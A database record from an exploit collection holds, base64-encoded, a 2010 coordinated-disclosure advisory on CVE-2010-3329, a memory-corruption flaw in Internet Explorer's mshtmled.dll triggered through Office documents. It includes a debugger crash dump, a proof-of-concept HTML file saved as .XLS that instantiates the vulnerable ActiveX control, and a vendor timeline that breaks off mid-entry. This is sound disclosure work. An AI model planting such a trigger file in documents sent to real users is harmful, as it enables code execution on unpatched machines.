{
    "source": "exploit-database", 
    "exploit": "Q29yZSBTZWN1cml0eSBUZWNobm9sb2dpZXMgLSBDb3JlTGFicyBBZHZpc29yeQ0KICAgICAgICAgICAgICAgICAgIGh0dHA6Ly9jb3JlbGFicy5jb3Jlc2VjdXJpdHkuY29tDQoNCiAgTWljcm9zb2Z0IE9mZmljZSBIdG1sRGxnSGVscGVyIGNsYXNzIG1lbW9yeSBjb3JydXB0aW9uDQoNCg0KMS4gKkFkdmlzb3J5IEluZm9ybWF0aW9uKg0KDQpUaXRsZTogTWljcm9zb2Z0IE9mZmljZSBIdG1sRGxnSGVscGVyIGNsYXNzIG1lbW9yeSBjb3JydXB0aW9uDQpBZHZpc29yeSBJZDogQ09SRS0yMDEwLTA1MTcNCkFkdmlzb3J5IFVSTDoNCltodHRwOi8vd3d3LmNvcmVzZWN1cml0eS5jb20vY29udGVudC9NUy1PZmZpY2UtSHRtbERsZ0hlbHBlci1tZW1vcnktY29ycnVwdGlvbl0NCkRhdGUgcHVibGlzaGVkOiAyMDEwLTEwLTEyDQpEYXRlIG9mIGxhc3QgdXBkYXRlOiAyMDEwLTEwLTE0DQpWZW5kb3JzIGNvbnRhY3RlZDogTWljcm9zb2Z0DQpSZWxlYXNlIG1vZGU6IENvb3JkaW5hdGVkIHJlbGVhc2UNCg0KDQoyLiAqVnVsbmVyYWJpbGl0eSBJbmZvcm1hdGlvbioNCg0KQ2xhc3M6IE1pc3NpbmcgSW5pdGlhbGl6YXRpb24gW0NXRS00NTZdDQpJbXBhY3Q6IENvZGUgZXhlY3V0aW9uDQpSZW1vdGVseSBFeHBsb2l0YWJsZTogWWVzDQpMb2NhbGx5IEV4cGxvaXRhYmxlOiBObw0KQ1ZFIE5hbWU6IENWRS0yMDEwLTMzMjkNCkJ1Z3RyYXEgSUQ6IE4vQQ0KDQoNCjMuICpWdWxuZXJhYmlsaXR5IERlc2NyaXB0aW9uKg0KDQpNaWNyb3NvZnQgV2luZG93cyBpcyBwcm9uZSB0byBhIG1lbW9yeSBjb3JydXB0aW9uIHZ1bG5lcmFiaWxpdHkgd2hlbg0KaW5zdGFudGlhdGluZyB0aGUgJ0h0bWxEbGdIZWxwZXIgQ2xhc3MgT2JqZWN0JyBpbiBhIE1pY3Jvc29mdCBPZmZpY2UNCkRvY3VtZW50IChpZTogLlhMUywgLkRPQykuIFRoZSBhZmZlY3RlZCB2dWxuZXJhYmxlIG1vZHVsZSBpcyBwYXJ0IG9mDQpJbnRlcm5ldCBFeHBsb3JlciAoJ21zaHRtbGVkLmRsbCcpLiBUaGlzIHZ1bG5lcmFiaWxpdHkgY291bGQgYmUgdXNlZCBieQ0KYSByZW1vdGUgYXR0YWNrZXIgdG8gZXhlY3V0ZSBhcmJpdHJhcnkgY29kZSB3aXRoIHRoZSBwcml2aWxlZ2VzIG9mIHRoZQ0KdXNlciB0aGF0IG9wZW5lZCB0aGUgbWFsaWNpb3VzIGZpbGUuDQoNCg0KNC4gKlZ1bG5lcmFibGUgcGFja2FnZXMqDQoNCiAgIC4gSUUgNg0KICAgLiBJRSA3DQogICAuIElFIDgNCiAgIC4gTVMgT2ZmaWNlIFhQDQogICAuIE1TIE9mZmljZSAyMDAzDQogICAuIE1TIE9mZmljZSAyMDA3IGFuZCBNUyBPZmZpY2UgMjAxMCAodGhlIGNvbnRyb2wgaXMgZGlzYWJsZWQgYnkgZGVmYXVsdCkNCg0KDQo1LiAqTm9uLXZ1bG5lcmFibGUgcGFja2FnZXMqDQoNCiAgIC4gRm9yIGZ1cnRoZXIgaW5mb3JtYXRpb24gYW5kIHBhdGNoZXMgYWJvdXQgdGhpcyBpc3N1ZSBsb29rIGF0IHRoZQ0KTWljcm9zb2Z0IFNlY3VyaXR5IEJ1bGxldGluIFN1bW1hcnkgZm9yIE9jdG9iZXIgMjAxMCBbMV0sIHBhdGNoIG1zMTAtMDcxLg0KDQoNCjYuICpDcmVkaXRzKg0KDQpUaGlzIHZ1bG5lcmFiaWxpdHkgd2FzIGRpc2NvdmVyZWQgYnkgRGFtaWFuIEZyaXp6YSBmcm9tIENvcmUgU2VjdXJpdHkNClRlY2hub2xvZ2llcy4NCg0KDQo3LiAqVGVjaG5pY2FsIERlc2NyaXB0aW9uIC8gUHJvb2Ygb2YgQ29uY2VwdCBDb2RlKg0KDQpNaWNyb3NvZnQgV2luZG93cyBpcyBwcm9uZSB0byBhIG1lbW9yeSBjb3JydXB0aW9uIHZ1bG5lcmFiaWxpdHkgd2hlbg0KaW5zdGFudGlhdGluZyB0aGUgJ0h0bWxEbGdIZWxwZXIgQ2xhc3MgT2JqZWN0Jw0KKCdDTEFTU0lEOjMwNTBmNGUxLTk4YjUtMTFjZi1iYjgyLTAwYWEwMGJkY2UwYicpIGluIGEgTWljcm9zb2Z0IE9mZmljZQ0KRG9jdW1lbnQgKGllOiAuWExTLCAuRE9DKS4gVGhlIGFmZmVjdGVkIHZ1bG5lcmFibGUgbW9kdWxlIGlzIHBhcnQgb2YNCkludGVybmV0IEV4cGxvcmVyICgnbXNodG1sZWQuZGxsJykuIFRoZSB2dWxuZXJhYmlsaXR5IG9jY3VycyBpbg0KJ21zaHRtbGVkLmRsbCcgd2hlbiB0aGUgZGVzdHJ1Y3RvciBvZiB0aGUgJ0NIdG1sRGxnSGVscGVyJyBjbGFzcyBpcw0KY2FsbGVkIGFuZCB0aGVuIG1ha2VzIGFjY2VzcyB0byB1bmluaXRpYWxpemVkIG1lbW9yeS4NCg0KVGhlIEFjdGl2ZVggY29udHJvbCBpcyBtYXJrZWQgYXMgIk5vdCBTYWZlIGZvciBJbml0aWFsaXphdGlvbiIsIGFuZA0KcHJvbXB0cyB0aGUgdXNlciB3aXRoOiAiQWN0aXZlWCBjb250cm9scyBtaWdodCBjb250YWluIHZpcnVzZXMgb3Igb3RoZXINCnNlY3VyaXR5IGhhemFyZHMuIERvIG5vdCBlbmFibGUgdGhpcyBjb250ZW50IHVubGVzcyB5b3UgdHJ1c3QgdGhlIHNvdXJjZQ0Kb2YgdGhpcyBmaWxlIi4gSG93ZXZlciwgaW4gT2ZmaWNlIDIwMDMgdGhlIGJ1ZyBpcyB0cmlnZ2VyZWQgZXZlbiBpZiB0aGUNCnVzZXIgYW5zd2VycyAiTm8iIHRvIHRoZSBwcm9tcHQuDQoNClRoZSBmb2xsb3dpbmcgY29kZSBpcyB3aGVyZSB0aGUgdnVsbmVyYWJpbGl0eSBvY2N1cnMsIHdoZW4gb3BlbmluZyBhDQouWExTIGRvY3VtZW50IG9uIE1pY3Jvc29mdCBPZmZpY2UgRXhjZWwgMjAwMyAoJ21zaHRtbGVkLmRsbCcNCnY4LjAuNjAwMS4xODcwMik6DQoNCi8tLS0tLQ0KbXNodG1sZWQhUmVsZWFzZUludGVyZmFjZToNCjQyYjkxOWMwIDhiZmYgICAgICAgICAgICBtb3YgICAgIGVkaSxlZGkNCjQyYjkxOWMyIDU1ICAgICAgICAgICAgICBwdXNoICAgIGVicA0KNDJiOTE5YzMgOGJlYyAgICAgICAgICAgIG1vdiAgICAgZWJwLGVzcA0KNDJiOTE5YzUgOGI0NTA4ICAgICAgICAgIG1vdiAgICAgZWF4LGR3b3JkIHB0ciBbZWJwKzhdDQpzczowMDIzOjAwMTNkMTA0PTAwMzEwMDY1DQo0MmI5MTljOCA4NWMwICAgICAgICAgICAgdGVzdCAgICBlYXgsZWF4DQo0MmI5MTljYSA3NDA2ICAgICAgICAgICAgamUgICAgICBtc2h0bWxlZCFSZWxlYXNlSW50ZXJmYWNlKzB4MTINCig0MmI5MTlkMikgW2JyPTBdDQo0MmI5MTljYyA4YjA4ICAgICAgICAgICAgbW92ICAgICBlY3gsZHdvcmQgcHRyIFtlYXhdICBkczowMDIzOjAwMzEwMDY1DQo0MmI5MTljZSA1MCAgICAgICAgICAgICAgcHVzaCAgICBlYXgNCjQyYjkxOWNmIGZmNTEwOCAgICAgICAgICBjYWxsICAgIGR3b3JkIHB0ciBbZWN4KzhdICAgDQpkczowMDIzOjdkMDIwMjljPTJhMmMyNzdhDQoNCmVheD0wMDMxMDA2NSBlYng9MDAwMDAwMDAgZWN4PTdkMDIwMjk0IGVkeD1kZjBiM2Q2MCBlc2k9MDAxZWRiZGMNCmVkaT0wMDAwMDAwMA0KZWlwPTJhMmMyNzdhIGVzcD0wMDEzZDBmNCBlYnA9MDAxM2QwZmMgaW9wbD0wICAgICAgICAgbnYgdXAgZWkgcGwgbnogbmENCnBlIG5jDQpjcz0wMDFiICBzcz0wMDIzICBkcz0wMDIzICBlcz0wMDIzICBmcz0wMDNiICBncz0wMDAwICAgICAgICAgICAgDQplZmw9MDAwMDAyMDYNCg0KU3RhY2sgVHJhY2U6DQo8VW5sb2FkZWRfaW9uLmRsbD4rMHgyYTJjMjc3OQ0KbXNodG1sZWQhUmVsZWFzZUludGVyZmFjZSsweDEyDQptc2h0bWxlZCFDSHRtbERsZ0hlbHBlcjo6fkNIdG1sRGxnSGVscGVyKzB4MTANCm1zaHRtbGVkIUFUTDo6Q0NvbUFnZ09iamVjdDxDSHRtbERsZ0hlbHBlcj46OmBzY2FsYXIgZGVsZXRpbmcNCmRlc3RydWN0b3InKzB4ZA0KbXNodG1sZWQhQVRMOjpDQ29tQWdnT2JqZWN0PENIdG1sRGxnSGVscGVyPjo6UmVsZWFzZSsweDI3DQpWQkU2IXJ0Y1N0ckNvbnZWYXIrMHhiZDY1DQpWQkU2IXJ0Y1NldERhdGFiYXNlTGNpZCsweGE4MjMNCkVYQ0VMIU9yZGluYWw0MSsweGQyYWQwDQpFWENFTCFPcmRpbmFsNDErMHgxNDA4MmENClVTRVIzMiFDYWxsV2luZG93UHJvY1crMHgxYg0KSW5zdHJ1Y3Rpb24gQWRkcmVzczogMHgwMDAwMDAwMDJhMmMyNzdhDQotLS0tLS8NCg0KDQpUaGUgZm9sbG93aW5nIGh0bWwgY29kZSBkZW1vbnN0cmF0ZXMgdGhlIGJ1ZyBvbiBFeGNlbCAyMDAyLzIwMDMuIFNhdmUNCnRoZSBmaWxlIGFzIC5YTFMgYW5kIG9wZW4gaXQgb24gRXhjZWwuDQoNCi8tLS0tLQ0KPGh0bWwgeG1sbnM6dj0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTp2bWwiDQp4bWxuczpvPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOm9mZmljZTpvZmZpY2UiDQp4bWxuczp4PSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOm9mZmljZTpleGNlbCI+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj1Db250ZW50LVR5cGUgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXdpbmRvd3MtMTI1MiI+DQo8bWV0YSBuYW1lPVByb2dJZCBjb250ZW50PUV4Y2VsLlNoZWV0Pg0KPG1ldGEgbmFtZT1HZW5lcmF0b3IgY29udGVudD0iTWljcm9zb2Z0IEV4Y2VsIDEwIj4NCjwhLS1baWYgIW1zb10+DQo8c3R5bGU+DQp2XDoqIHtiZWhhdmlvcjp1cmwoI2RlZmF1bHQjVk1MKTt9DQpvXDoqIHtiZWhhdmlvcjp1cmwoI2RlZmF1bHQjVk1MKTt9DQp4XDoqIHtiZWhhdmlvcjp1cmwoI2RlZmF1bHQjVk1MKTt9DQouc2hhcGUge2JlaGF2aW9yOnVybCgjZGVmYXVsdCNWTUwpO30NCjwvc3R5bGU+DQo8IVtlbmRpZl0tLT48IS0tW2lmIGd0ZSBtc28gOV0+PHhtbD4NCiA8bzpEb2N1bWVudFByb3BlcnRpZXM+DQogIDxvOkxhc3RBdXRob3I+VEVTVDwvbzpMYXN0QXV0aG9yPg0KICA8bzpMYXN0U2F2ZWQ+MjAxMC0wOC0wM1QwNToxOTo1MVo8L286TGFzdFNhdmVkPg0KICA8bzpWZXJzaW9uPjEwLjY4NTg8L286VmVyc2lvbj4NCiA8L286RG9jdW1lbnRQcm9wZXJ0aWVzPg0KIDxvOk9mZmljZURvY3VtZW50U2V0dGluZ3M+DQogIDxvOkRvd25sb2FkQ29tcG9uZW50cy8+DQogIDwvbzpPZmZpY2VEb2N1bWVudFNldHRpbmdzPg0KPC94bWw+PCFbZW5kaWZdLS0+DQoNCjwhLS1baWYgZ3RlIG1zbyA5XT48eG1sPg0KIDx4OkV4Y2VsV29ya2Jvb2s+DQogIDx4OkV4Y2VsV29ya3NoZWV0cz4NCiAgIDx4OkV4Y2VsV29ya3NoZWV0Pg0KICAgIDx4Ok5hbWU+dGVzdDwveDpOYW1lPg0KICAgIDx4OldvcmtzaGVldE9wdGlvbnM+DQogICAgIDx4OkNvZGVOYW1lPlNoZWV0MTwveDpDb2RlTmFtZT4NCiAgICAgPHg6U2VsZWN0ZWQvPg0KICAgICA8eDpEb05vdERpc3BsYXlHcmlkbGluZXMvPg0KICAgICA8eDpQcm90ZWN0Q29udGVudHM+RmFsc2U8L3g6UHJvdGVjdENvbnRlbnRzPg0KICAgICA8eDpQcm90ZWN0T2JqZWN0cz5GYWxzZTwveDpQcm90ZWN0T2JqZWN0cz4NCiAgICAgPHg6UHJvdGVjdFNjZW5hcmlvcz5GYWxzZTwveDpQcm90ZWN0U2NlbmFyaW9zPg0KICAgIDwveDpXb3Jrc2hlZXRPcHRpb25zPg0KICAgPC94OkV4Y2VsV29ya3NoZWV0Pg0KICA8L3g6RXhjZWxXb3Jrc2hlZXRzPg0KICA8eDpXaW5kb3dIZWlnaHQ+OTM0NTwveDpXaW5kb3dIZWlnaHQ+DQogIDx4OldpbmRvd1dpZHRoPjEzMjYwPC94OldpbmRvd1dpZHRoPg0KICA8eDpXaW5kb3dUb3BYPjI0MDwveDpXaW5kb3dUb3BYPg0KICA8eDpXaW5kb3dUb3BZPjYwPC94OldpbmRvd1RvcFk+DQogIDx4OlByb3RlY3RTdHJ1Y3R1cmU+RmFsc2U8L3g6UHJvdGVjdFN0cnVjdHVyZT4NCiAgPHg6UHJvdGVjdFdpbmRvd3M+RmFsc2U8L3g6UHJvdGVjdFdpbmRvd3M+DQogPC94OkV4Y2VsV29ya2Jvb2s+DQo8L3htbD48IVtlbmRpZl0tLT48IS0tW2lmIGd0ZSBtc28gOV0+PHhtbD4NCiA8bzpzaGFwZWRlZmF1bHRzIHY6ZXh0PSJlZGl0IiBzcGlkbWF4PSIxMDI2Ii8+DQo8L3htbD48IVtlbmRpZl0tLT48IS0tW2lmIGd0ZSBtc28gOV0+PHhtbD4NCiA8bzpzaGFwZWxheW91dCB2OmV4dD0iZWRpdCI+DQogIDxvOmlkbWFwIHY6ZXh0PSJlZGl0IiBkYXRhPSIxIi8+DQogPC9vOnNoYXBlbGF5b3V0PjwveG1sPjwhW2VuZGlmXS0tPg0KPC9oZWFkPg0KDQo8Ym9keSBsaW5rPWJsdWUgdmxpbms9cHVycGxlPg0KDQo8dGFibGUgeDpzdHIgYm9yZGVyPTAgY2VsbHBhZGRpbmc9MCBjZWxsc3BhY2luZz0wIHdpZHRoPTY0DQpzdHlsZT0nYm9yZGVyLWNvbGxhcHNlOg0KIGNvbGxhcHNlO3RhYmxlLWxheW91dDpmaXhlZDt3aWR0aDo0OHB0Jz4NCiA8Y29sIHdpZHRoPTY0IHN0eWxlPSd3aWR0aDo0OHB0Jz4NCiA8dHIgaGVpZ2h0PTE3IHN0eWxlPSdoZWlnaHQ6MTIuNzVwdCc+DQogIDx0ZCBoZWlnaHQ9MTcgd2lkdGg9NjQgc3R5bGU9J2hlaWdodDoxMi43NXB0O3dpZHRoOjQ4cHQnIGFsaWduPWxlZnQNCiAgdmFsaWduPXRvcD48IS0tW2lmIGd0ZSB2bWwgMV0+PHY6c2hhcGV0eXBlIGlkPSJfeDAwMDBfdDIwMSINCmNvb3Jkc2l6ZT0iMjE2MDAsMjE2MDAiDQogICBvOnNwdD0iMjAxIiBwYXRoPSJtLGwsMjE2MDByMjE2MDAsbDIxNjAwLHhlIj4NCiAgIDx2OnN0cm9rZSBqb2luc3R5bGU9Im1pdGVyIi8+DQogICA8djpwYXRoIHNoYWRvd29rPSJmIiBvOmV4dHJ1c2lvbm9rPSJmIiBzdHJva2Vvaz0iZiIgZmlsbG9rPSJmIg0KICAgIG86Y29ubmVjdHR5cGU9InJlY3QiLz4NCiAgIDxvOmxvY2sgdjpleHQ9ImVkaXQiIHNoYXBldHlwZT0idCIvPg0KICA8L3Y6c2hhcGV0eXBlPjx2OnNoYXBlIGlkPSJfeDAwMDBfczEwMjUiIHR5cGU9IiNfeDAwMDBfdDIwMSINCnN0eWxlPSdwb3NpdGlvbjphYnNvbHV0ZTsNCiAgIG1hcmdpbi1sZWZ0OjA7bWFyZ2luLXRvcDowO3dpZHRoOjQ4cHQ7aGVpZ2h0OjEyLjc1cHQ7ei1pbmRleDoxJw0KICAgc3Ryb2tlY29sb3I9IndpbmRvd1RleHQgWzY0XSIgbzppbnNldG1vZGU9ImF1dG8iPg0KICAgPCFbaWYgZ3RlIG1zbyA5XT48bzp0aXRsZT0iIi8+DQogICA8IVtlbmRpZl0+PHg6Q2xpZW50RGF0YSBPYmplY3RUeXBlPSJQaWN0Ij4NCiAgICA8eDpTaXplV2l0aENlbGxzLz4NCiAgICA8eDpDRj5QaWN0PC94OkNGPg0KICAgIDx4OkF1dG9QaWN0Lz4NCiAgIDwveDpDbGllbnREYXRhPg0KICA8L3Y6c2hhcGU+PCFbZW5kaWZdLS0+PCFbaWYgIXZtbF0+PHNwYW4gc3R5bGU9J21zby1pZ25vcmU6dmdsYXlvdXQ7DQogIHBvc2l0aW9uOmFic29sdXRlO3otaW5kZXg6MTttYXJnaW4tbGVmdDowcHg7bWFyZ2luLXRvcDowcHg7d2lkdGg6NjRweDsNCiAgaGVpZ2h0OjE3cHgnPjwhW2VuZGlmXT4NCg0KPG9iamVjdCBjbGFzc2lkPSJDTFNJRDozMDUwRjRFMS05OEI1LTExQ0YtQkI4Mi0wMEFBMDBCRENFMEIiDQppZD1vYmo+PC9vYmplY3Q+DQoNCjwhW2lmICF2bWxdPjwvc3Bhbj48IVtlbmRpZl0+PHNwYW4NCiAgc3R5bGU9J21zby1pZ25vcmU6dmdsYXlvdXQyJz4NCiAgPHRhYmxlIGNlbGxwYWRkaW5nPTAgY2VsbHNwYWNpbmc9MD4NCiAgIDx0cj4NCiAgICA8dGQgaGVpZ2h0PTE3IHdpZHRoPTY0IHN0eWxlPSdoZWlnaHQ6MTIuNzVwdDt3aWR0aDo0OHB0Jz48L3RkPg0KICAgPC90cj4NCiAgPC90YWJsZT4NCiAgPC9zcGFuPjwvdGQ+DQogPC90cj4NCiA8IVtpZiBzdXBwb3J0TWlzYWxpZ25lZENvbHVtbnNdPg0KIDx0ciBoZWlnaHQ9MCBzdHlsZT0nZGlzcGxheTpub25lJz4NCiAgPHRkIHdpZHRoPTY0IHN0eWxlPSd3aWR0aDo0OHB0Jz48L3RkPg0KIDwvdHI+DQogPCFbZW5kaWZdPg0KPC90YWJsZT4NCjwvYm9keT4NCjwvaHRtbD4NCg0KLS0tLS0vDQoNCg0KVGhpcyBleHBsb2l0YWJsZSBjb25kaXRpb24gd2FzIHJlcHJvZHVjZWQgaW4gdGhlIGZvbGxvd2luZyB2ZXJzaW9ucyBvZg0KJ21zaHRtbGVkLmRsbCc6DQoNCiAgIC4gJ21zaHRtbGVkLmRsbCcgdjguMC42MDAxLjE4NzAyDQogICAuICdtc2h0bWxlZC5kbGwnIHY4LjAuNjAwMS4xODAwMA0KICAgLiAnbXNodG1sZWQuZGxsJyB2Ny4wLjYwMDAuMTcwMjMNCiAgIC4gJ21zaHRtbGVkLmRsbCcgdjcuMC42MDAwLjE3MDgwDQoNCg0KOC4gKlJlcG9ydCBUaW1lbGluZSoNCg0KLiAyMDEwLTA1LTI4Og0KSW5pdGlhbCBub3RpZmljYXRpb24gdG8gdGhlIHZlbmRvci4gRHJhZnQgYWR2aXNvcnkgYW5kIHByb29mLW9mLWNvbmNlcHQNCmZpbGVzIHNlbnQgdG8gTVNSQy4gUHVibGljYXRpb24gZGF0ZSBzZXQgZm9yIEp1bHkgMTMsIDIwMTAuDQoNCi4gMjAxMC0wNi0xMToNCkNvcmUgcmVxdWVzdHMgZnJvbSB0aGUgdmVuZG9yIGFuIHVwZGF0ZSBvbiB0aGUgc3RhdHVzIG9mIHRoaXMgY2FzZS4NCg0KLiAyMDEwLTA2LTE0Og0KVGhlIHZlbmRvciByZXNwb25kcyB0aGF0IGl0cyBlbmdpbmVlcnMgYXJlIHN0aWxsIGludmVzdGlnYXRpbmcgdGhpcw0KaXNzdWU7IGFuZCB0aGF0IHRoZXkgZXhwZWN0IHRvIGhhdmUgbW9yZSBpbmZvcm1hdGlvbiBmcm9tIHRoZQ0KaW52ZXN0aWdhdGlvbiBhbmQgdHJpYWdlIHByb2Nlc3Mgd2l0aGluIHRoZSBuZXh0IGZldyBkYXlzLg0KDQouIDIwMTAtMDYtMTU6DQpUaGUgdmVuZG9ycyBpbmZvcm1zIHRoYXQgdGhleSBoYXZlIGJlZW4gZGV0ZXJtaW5lZCB0aGF0IHRoZSBBY3RpdmVYDQpjb250cm9sIGlzIG1hcmtlZCBhcyAiTm90IFNhZmUgZm9yIEluaXRpYWxpemF0aW9uIjsgYW5kIHByb21wdHMgdGhlIHVzZXINCndpdGggYSBkaWFsb2cgdGhhdCB3YXJucyB0aGUgdXNlciB0aGF0IHRoZXkgYXJlIGdvaW5nIHRvIGJlIGV4ZWN1dGluZyBhDQpwb3RlbnRpYWxseSBtYWxpY2lvdXMgY29kZS4gSW4gY29uc2VxdWVuY2UsIHRoZSB2ZW5kb3IgdHJlYXRzIHRoaXMgY2FzZQ0KYXMgdGhlIHNhbWUgc2NlbmFyaW8gYXMgYSB1c2VyIHRoYXQgdHJpZXMgdG8gZW5hYmxlIGFuZCBvcGVuIGFuIE9mZmljZQ0KZG9jdW1lbnQgd2l0aCBhIE1hY3JvIG9yIFZCQSBjb2RlIGNvbnRhaW5lZCB3aXRoaW4uDQoNCi4gMjAxMC0wNi0xNToNCkNvcmUgYXNrcyB0aGUgdmVuZG9yIGlmIHRoZSBwcmV2aW91cyBtYWlsIG1lYW5zIHRoYXQgaXQgZG9lcyBub3QgaW50ZW50DQp0byBmaXggdGhlIGJ1ZyBvciB0aGF0IGl0IGRvZXMgbm90IHJlY29nbml6ZSBpdCBhcyBhIHNlY3VyaXR5IGlzc3VlLiBUaGUNCnJlcG9ydGVyJ3Mgdmlld3BvaW50IGlzIHRoYXQgYSBkaWFsb2cgcHJvbXB0IGlzIG5vdCBhIGZpeCAicGVyIHNlIiBhbmQNCmp1c3QgYSBkZWZlbnNlIGluIGRlcHRoIG1lY2hhbmlzbTsgYW5kIHRoYXQgaGUgd291bGQgcHJlZmVyIHRvIHNlZSB0aGUNCmJ1ZyBmaXhlZCByYXRoZXIgdGhhbiByZWx5aW5nIG9uIG1pdGlnYXRpb25zIHRoYXQgcHJldmVudCBleHBsb2l0YXRpb24uDQoNCi4gMjAxMC0wNi0xNToNCkNvcmUgYWRkcyB0aGUgZm9sbG93aW5nIGluZm9ybWF0aW9uOiBpbiBPZmZpY2UgMjAwMyBldmVuIGlmIHRoZSB1c2VyDQphbnN3ZXJzIE5vIHRvIHRoZSBBY3RpdmVYIGRpYWxvZywgdGhlIGFwcGxpY2F0aW9uIGVuZHMgdXAgY3Jhc2hpbmcuDQoNCi4gMjAxMC0wNi0xNjoNClZlbmRvciByZXNwb25kcyB0aGF0IGl0IGlzIGN1cnJlbnRseSBpbnZlc3RpZ2F0aW5nIHRoZSBuZXcgaW5mb3JtYXRpb24uDQoNCi4gMjAxMC0wNi0yODoNClZlbmRvciBpbmZvcm1zIHRoYXQgaXQgaGFzIGZvdW5kIHRoYXQgdGhlIHZ1bG5lcmFibGUgY29kZSBhY3R1YWxseQ0KZXhpc3RzIGFuZCBpcyBvd25lZCBieSB0aGUgSUUgdGVhbSB3aG9tIGlzIGN1cnJlbnRseSBpbnZlc3RpZ2F0aW5nIHRoZQ0KY3Jhc2g7IGFuZCB0aGF0IHRoaXMgY2FzZSBpcyB0cmFuc2ZlcnJlZCBvdmVyIHRvIHRoZW0gKGFuZCB0byBhIG5ldyBjYXNlDQptYW5hZ2VyIGFzIHdlbGwpLg0KDQouIDIwMTAtMDctMDI6DQpWZW5kb3IgaW5mb3JtcyBDb3JlIHRoYXQgdGhlIElFIHRlYW0gaGFzIGZpbmlzaGVkIHRoZSBpbnZlc3RpZ2F0aW9uIGludG8NCnRoaXMgaXNzdWUgYW5kIHdhcyBhYmxlIHRvIHJlcHJvZHVjZSB0aGUgaXNzdWUgcmVwb3J0ZWQuIER1cmluZyB0aGUNCmludmVzdGlnYXRpb24gaXQgd2FzIGRldGVybWluZWQgdGhhdCB0aGlzIGlzIGFuIGV4cGxvaXRhYmxlIGNyYXNoIGluDQpJbnRlcm5ldCBFeHBsb3Jlci4gVmVuZG9yIHdpbGwgc2VuZCBDb3JlIHRoZSBsaXN0IG9mIGFmZmVjdGVkIEludGVybmV0DQpFeHBsb3JlciB2ZXJzaW9ucyB3aGVuIGF2YWlsYWJsZS4NCg0KLiAyMDEwLTA3LTAyOg0KQ29yZSBhY2tub3dsZWRnZXMgcmVjZWlwdCBvZiB0aGUgdXBkYXRlLCBhbmQgcmVtaW5kcyB0aGF0IGFsdGhvdWdoIHRoZQ0KdnVsbmVyYWJsZSBjb2RlIGlzIG93bmVkIGJ5IHRoZSBJRSB0ZWFtIHRoaXMgYWxzbyBhZmZlY3RzIE9mZmljZQ0KKGluY2x1ZGluZyAyMDEwKS4gQ29yZSBvZmZlcnMgdG8gcG9zdHBvbmUgcHVibGljYXRpb24gb2YgaXRzIGFkdmlzb3J5DQpmcm9tIEp1bHkgMTN0aCB0byBBdWd1c3QgMTB0aCBvbiB0aGUgYmFzaXMgb2YgYSBmaXJtIGNvbW1pdG1lbnQgdG8gYQ0KcmVsZWFzZSBkYXRlIGZyb20gdGhlIHZlbmRvcidzIHNpZGUuIENvcmUgaW5mb3JtcyB0aGF0IGl0IGlzIGV2YWx1YXRpbmcNCnRoZSBwb3NzaWJpbGl0eSBvZiB1c2luZyBPZmZpY2Uga2lsbGJpdCByZWNlbnRseSBpbnRyb2R1Y2VkIGJ5IE1TMTAtMDM2DQphcyBhIHdvcmthcm91bmQsIGJ1dCB0aGF0IE1TMTAtMDM2IHBvaW50cyB0byBhIGtub3dsZWRnZSBiYXNlIGFydGljbGUNClsyXSB0aGF0IGlzIG5vIGxvbmdlciBhdmFpbGFibGUuDQoNCi4gMjAxMC0wNy0wNzoNClZlbmRvciBhY2tub3dsZWRnZXMgcHJldmlvdXMgbWFpbCwgYW5kIHN0YXRlcyB0aGF0IGl0IHdpbGwgZGV0ZXJtaW5lDQp3aXRoIHRoZSBwcm9kdWN0IHRlYW0gaG93IHRoaXMgZml4IGNvdWxkIGJlIGluY2x1ZGVkIGluIHRoZSBBdWd1c3QNCnJlbGVhc2UuIFZlbmRvciByZXF1ZXN0cyBhbiB1cGRhdGVkIHZlcnNpb24gb2YgdGhlIGFkdmlzb3J5LCBhbmQgdG8NCmluY2x1ZGUgYSB2ZW5kb3Igc3RhdGVtZW50Lg0KDQouIDIwMTAtMDctMjI6DQpDb3JlIHJlcXVlc3RzIGFuIHVwZGF0ZSBvbiB0aGUgc3RhdHVzIG9mIHRoZSB2dWxuZXJhYmlsaXR5IHJlcG9ydDsgYW5kDQppbmZvcm1zIHRoYXQgcHVibGljYXRpb24gb2YgaXRzIGFkdmlzb3J5IGhhcyBiZWVuIHJlc2NoZWR1bGVkIHRvIEF1Z3VzdA0KMTAsIDIwMTAsIGRlc3BpdGUgdGhlIGZhY3QgdGhhdCBDb3JlIGRpZCBub3QgcmVjZWl2ZSBhbnkgdXBkYXRlcy4gQ29yZQ0KaW5mb3JtcyB0aGF0IHRoZSBwdWJsaWNhdGlvbiBvZiB0aGlzIGFkdmlzb3J5IGlzIHRyYW5zZmVycmVkIHRvIGEgbmV3DQpjYXNlIG1hbmFnZXIuDQoNCi4gMjAxMC0wOC0wNDoNCkNvcmUgc2VuZHMgYW4gdXBkYXRlZCB2ZXJzaW9uIG9mIHRoZSBhZHZpc29yeSBhbmQgYWxzbyBhc2tzIGlmIE1TUkMgY2FuDQpwcm92aWRlOg0KICAgMS4gVGhlIGxpc3Qgb2YgYWZmZWN0ZWQgc29mdHdhcmUgdmVyc2lvbnMuDQogICAyLiBUaGUgQ1ZFIG51bWJlciBhc3NpZ25lZCB0byB0aGlzIHZ1bG5lcmFiaWxpdHkgKGlmIGl0IGV4aXN0cykuDQogICAzLiBUaGUgc3RlcHMgdG8gcmVwcm9kdWNlIHRoZSB2dWxuZXJhYmlsaXR5IGluIElFIFszXS4NCiAgIDQuIFRoZSBsaW5rIHRvIHRoZSBrbm93bGVkZ2UgYmFzZSBhcnRpY2xlIGFib3V0IHRoZSBuZXdseSBpbnRyb2R1Y2VkDQpPZmZpY2Uga2lsbGJpdCBnaXZlbiB0aGF0IENvcmUgaXMgaW52ZXN0aWdhdGluZyB1c2luZyB0aGF0IGRlZmVuc2UNCm1lY2hhbmlzbSBhcyBhIHdvcmthcm91bmQgYnV0IE1TMTAtMDM2IHBvaW50cyB0byBhIGtub3dsZWRnZSBiYXNlDQphcnRpY2xlIHRoYXQgaXMgbm8gbG9uZ2VyIGF2YWlsYWJsZQ0KKFtodHRwOi8vc3VwcG9ydC5taWNyb3NvZnQuY29tL2tiLzk4MzYzMl0pLg0KDQogQ29yZSBhbHNvIG5vdGlmaWVzIHRoaXMgYWR2aXNvcnkgaXMgY3VycmVudGx5IHNjaGVkdWxlZCB0byBiZSBwdWJsaXNoZWQNCm9uIEF1Z3VzdCAxMCwgMjAxMCBidXQgdGhlIHB1